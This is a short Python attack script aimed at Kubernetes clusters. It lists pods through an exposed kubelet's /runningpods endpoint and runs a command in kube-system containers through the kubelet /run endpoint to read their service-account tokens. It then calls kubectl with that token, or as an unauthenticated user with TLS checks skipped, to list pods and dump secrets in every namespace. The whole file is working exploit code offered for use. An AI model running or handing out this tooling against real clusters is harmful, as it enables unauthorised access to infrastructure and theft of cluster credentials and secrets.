from distutils.spawn import spawn
import json, base64
import requests, pty

def listar_pods(hostFull):
    pods_req = requests.get(hostFull + "/runningpods", verify=False)
    req_content_bytes = pods_req.content
    req_content_str = req_content_bytes.decode("utf-8")
    pods_json = json.loads(req_content_str)
    pods = pods_json['items']
    aux = []
    for i in range(len(pods)):
        for key, value in pods[i].items():
            if key == "status":
                continue
            else:
                temp = value
                aux.append(temp)

    namespace = []
    pod = []
    containersDict = []
    container = []
    
    for i in range(len(aux)):
        for key, value in aux[i].items():
            if key == "name":
                pod.append(value)
            elif key == "namespace":
                namespace.append(value)
            elif key == "containers":
                containersDict.append(value)

    for i in range(len(containersDict)):
        for y in containersDict[i]:
            container.append(y["name"])

                
    return pod, namespace, container

def listar_pods_api(hostFull):
    listar = "kubectl --insecure-skip-tls-verify=true --username=system:unauthenticated --server=" + (hostFull) + " get pods --all-namespaces"
    listar = listar.split(" ")
    print()
    pty.spawn(listar)
    print()

def listar_secrets(hostFull):

    listar = "kubectl --insecure-skip-tls-verify=true --username=system:unauthenticated --server=" + (hostFull) + " describe secrets --all-namespaces"
    listar = listar.split(" ")
    print()
    pty.spawn(listar)
    print()

def listar_secrets_kubelet(host, pod, container, id):
    kubectl_secret = requests.post("https://" + host + ":10250/run/kube-system/" + pod[id] + "/" + container[id], data={"cmd":"cat /var/run/secrets/kubernetes.io/serviceaccount/token"}, verify=False)
    kubectl_secret_bytes = kubectl_secret.content
    kubectl_secret_str = kubectl_secret_bytes.decode("utf-8")
    listar = "kubectl --insecure-skip-tls-verify=true --server=https://" + (host) + ":8443 --token=" + (kubectl_secret_str) + " describe secrets --all-namespaces"
    listar = listar.split(" ")
    print()
    pty.spawn(listar)
    print()

def listar_pods_service(host, serviceaccount, ns):
    listar = "kubectl --insecure-skip-tls-verify=true --server=https://" + (host) + ":8443 --token=" + (serviceaccount) + " -n " + (ns) + " get pods"
    listar = listar.split(" ")
    print()
    pty.spawn(listar)
    print()